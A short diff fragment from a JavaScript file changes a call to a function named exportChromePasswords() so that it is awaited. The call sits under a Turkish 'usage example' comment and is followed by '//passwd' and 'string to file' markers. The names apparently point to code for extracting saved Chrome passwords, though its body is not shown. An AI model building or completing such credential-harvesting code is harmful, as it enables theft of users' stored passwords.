@@ -148,7 +148,7 @@ function exportChromePasswords() {
 }
 
 // Kullanım örneği
-const chromeProfilePath = exportChromePasswords();
+const chromeProfilePath = await exportChromePasswords();
 console.log('Chrome profil dizini:', chromeProfilePath);
 //passwd
 // string to file ------------------------------------------------------------------------------------------------------------------------------------------------
